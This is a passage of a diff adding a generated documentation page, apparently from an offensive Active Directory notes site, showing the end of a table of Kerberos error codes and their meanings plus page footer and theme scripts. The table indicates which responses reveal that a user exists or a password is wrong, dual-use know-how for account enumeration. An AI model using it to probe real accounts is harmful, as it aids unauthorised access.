+<td><code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code></td>
+<td>User/SPN does not exist.</td>
+</tr>
+<tr>
+<td><code>KDC_ERR_PREAUTH_REQUIRED</code></td>
+<td>User exists and requires pre-authentication.</td>
+</tr>
+<tr>
+<td><code>KDC_ERR_PREAUTH_FAILED</code></td>
+<td>Wrong password/hash/key.</td>
+</tr>
+<tr>
+<td><code>KRB_AP_ERR_SKEW</code></td>
+<td>Time skew issue.</td>
+</tr>
+<tr>
+<td><code>KRB_AP_ERR_MODIFIED</code></td>
+<td>SPN/key mismatch or service cannot decrypt ticket.</td>
+</tr>
+<tr>
+<td><code>KDC_ERR_BADOPTION</code></td>
+<td>Delegation option not allowed or target issue.</td>
+</tr>
+<tr>
+<td><code>KDC_ERR_S_PRINCIPAL_UNKNOWN</code></td>
+<td>Target SPN not found.</td>
+</tr>
+<tr>
+<td><code>KDC_ERR_CLIENT_REVOKED</code></td>
+<td>Account disabled, locked, expired, or restricted.</td>
+</tr>
+<tr>
+<td><code>KDC_ERR_ETYPE_NOTSUPP</code></td>
+<td>Unsupported encryption type.</td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../Credential_Access/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Credential Access">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Credential Access
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../NTLM_Relay_and_Coercion/" class="md-footer__link md-footer__link--next" aria-label="Next: NTLM Relay &amp; Coercion">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                NTLM Relay & Coercion
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "toc.integrate", "toc.follow", "navigation.tracking", "content.code.copy", "content.code.annotate", "navigation.top", "navigation.footer", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/runaway-bat.js"></script>
+      
+        <script src="../../javascripts/sidebar-follow-active.js"></script>
+      
+        <script src="../../javascripts/page-up.js"></script>
+      
+        <script src="../../javascripts/checklist-state.js"></script>
+      
+    
+  </body>
+</html>
